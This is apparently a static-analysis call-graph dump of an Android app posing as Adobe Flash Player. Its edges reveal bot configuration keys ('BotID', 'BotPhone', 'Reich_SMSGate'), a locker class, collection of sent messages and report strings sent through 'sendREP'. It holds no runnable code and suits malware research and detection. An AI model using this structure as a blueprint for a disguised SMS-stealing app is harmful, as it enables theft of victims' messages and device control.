VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r2.<android.content.Intent: android.content.Intent setFlags(int)>(268435456) in <com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)> ==> <android.content.Intent: android.content.Intent setFlags(int)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r20.<java.lang.String: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String toString()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r2.<android.content.Intent: android.content.Intent setFlags(int)>(1048576) in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: android.content.Intent setFlags(int)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r8 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotLocation", $r4) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r9, $r18, $r21, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: $r12 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forceZ", "Off", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r8 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [ Sent Messages ] \n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <com.adobe.flashplayer.Certificate$2: void <init>(com.adobe.flashplayer.Certificate)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer.Certificate: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r24.<java.lang.String: int indexOf(java.lang.String)>("start") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r10) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r2) in <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
VIRTUAL edge: $r15 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.ADOBEcoreZa: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.ADOBEcoreZa: void onDisabled(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.ADOBEcoreZa: android.content.Intent getIntent()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r12) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r30 = staticinvoke <java.lang.String: java.lang.String valueOf(long)>($l4) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(long)>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r6.<com.adobe.flashplayer.Certificate$1: void <init>(com.adobe.flashplayer.Certificate)>(r0) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <com.adobe.flashplayer.Certificate$1: void <init>(com.adobe.flashplayer.Certificate)>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_SMSGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", $r24, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: r34 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forceZ", "On", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeUtil: void onCreate()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeUtil: void onCreate()>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
SPECIAL edge: $r19 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotNetwork", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r32.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: specialinvoke $r2.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>($r1, class "Lcom/adobe/flashplayer_/AdobeFlashCore;") in <com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.packages.ZLocker: java.lang.Object getSystemService(java.lang.String)>("phone") in <com.adobe.packages.ZLocker: void <init>()> ==> <android.app.Activity: java.lang.Object getSystemService(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r52.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r20 = staticinvoke <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>($l4) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.Throwable: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r24 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r2 = virtualinvoke $r0.<com.adobe.flashplayer_.MacrosStat: android.os.IBinder onBind(android.content.Intent)>(null) in <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)> ==> <com.adobe.flashplayer_.MacrosStat: android.os.IBinder onBind(android.content.Intent)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r2) in <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<com.adobe.flashplayer.Certificate$2: void <init>(com.adobe.flashplayer.Certificate)>($r0) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate$2: void <init>(com.adobe.flashplayer.Certificate)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashARM: void onDestroy()>() in <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashARM: void onDestroy()>
SPECIAL edge: $r11 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotNetwork", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r7 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r6 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotID", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r14.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r12) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
